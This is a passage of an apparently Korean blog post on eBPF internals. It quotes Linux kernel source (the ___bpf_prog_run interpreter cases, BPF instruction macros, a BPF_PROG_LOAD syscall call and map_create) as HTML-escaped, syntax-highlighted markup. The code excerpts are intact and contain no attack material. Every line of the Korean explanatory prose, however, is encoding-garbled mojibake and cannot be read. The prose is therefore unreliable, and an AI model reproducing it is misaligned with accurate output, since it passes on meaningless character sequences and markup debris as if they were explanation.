&lt;span class=&quot;mh&quot;&gt;0xffffffff8114949a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;___bpf_prog_run&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;core&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1430&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1429&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;LD_IMM_DW&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1430&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;DST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1431&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1432&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;CONT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1433&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;ALU_ARSH_X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1434&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;DST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SRC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì‹¤ì œ ì í”„ í™•ì¸&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;1429&lt;/span&gt;	 	&lt;span class=&quot;n&quot;&gt;LD_IMM_DW&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;â†’&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1430&lt;/span&gt;	 		&lt;span class=&quot;n&quot;&gt;DST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;mi&quot;&gt;1431&lt;/span&gt;	 		&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;span class=&quot;mi&quot;&gt;1432&lt;/span&gt;	 		&lt;span class=&quot;n&quot;&gt;CONT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ebpf&quot;&gt;eBPF&lt;/h2&gt;

&lt;p&gt;ê¸°ì¡´BPFëŠ” &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;X&lt;/code&gt;ë‘ê°œì˜ ë ˆì§€ìŠ¤í„°ë§Œ ìˆì—ˆëŠ”ë° &lt;code class=&quot;highlighter-rouge&quot;&gt;R0&lt;/code&gt; ~ &lt;code class=&quot;highlighter-rouge&quot;&gt;R10&lt;/code&gt;ê¹Œì§€ í™•ì¥ë˜ì—ˆë‹¤. ë˜í•œ ë©”ëª¨ë¦¬ì™€ ìŠ¤íƒì„ ì‚¬ìš© ê°€ëŠ¥í•˜ë‹¤. ì œí•œì ì¸ BPFì™€ ë‹¬ë¦¬ ê±°ì˜ ì–´ì…ˆë¸”ë¦¬ì™€ ê±°ì˜ ë™ì¼í•˜ê²Œ ì‚¬ìš© ê°€ëŠ¥í•´ì¡Œë‹¤. ê¸°ë³¸ì ì¸ ì‚¬ìš©ì€ ì•„ë˜ì™€ ê°™ì´ ê°€ëŠ¥í•˜ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BPF_MOV64_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_REG_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// R3 = 1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/include/linux/filter.c&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ ì™¸ ì˜ˆì œë“¤&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BPF_ALU64_REG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_ARSH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// R7 &amp;gt;&amp;gt; r5&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_JMP_IMM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_JNE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// if (REG3 != 0) jmp 3&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_LDX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// R3 = [R9 + 24]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BPF_STX_MEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BPF_DW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_REG_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// [R8+0] = R6&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;eBPFí”„ë¡œê·¸ë¨ì´ ì²˜ìŒ ë¡œë“œë  ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;BPF_PROG_LOAD&lt;/code&gt;ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ”ë° ì´ ëª…ë ¹ì€ í”„ë¡œê·¸ë¨ì˜ file descriptorë¥¼ ë¦¬í„´í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_attr&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prog_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insns&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr_to_u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;license&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr_to_u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;license&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr_to_u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bpf_log_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOG_BUF_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;syscall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__NR_BPF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BPF_PROG_LOAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;maps&quot;&gt;Maps&lt;/h3&gt;

&lt;p&gt;ë°ì´í„°ë¥¼ ì €ì¥í•  ë•Œ eBPF í”„ë¡œê·¸ë¨ì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. ì¼ë°˜ì ì¸ key-valueë¡œ ì´ë£¨ì–´ì§„ ë§µì´ë‹¤. ë§Œë“¤ì–´ì§„ ë§µ ë˜í•œ file descriptorë¥¼ ì´ìš©í•´ ì ‘ê·¼ ê°€ëŠ¥í•˜ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define BPF_MAP_CREATE_LAST_FIELD btf_value_type_id
&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* called via syscall */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;map_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numa_node&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_map_attr_numa_node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_map_memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* find map type and init map: hashtable vs rbtree vs bloom vs ... */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find_and_alloc_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IS_ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PTR_ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;// bpf_obj_name_cpyëŠ” copy_from_userì™€ ê°™ì€ ì—­í• &lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_obj_name_cpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_key_type_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_value_type_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;btf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;btf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;btf_get_by_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;btf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_key_type_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_key_type_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_value_type_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;btf_value_type_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;spin_lock_off&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_bpf_map_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bpf_map_alloc_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
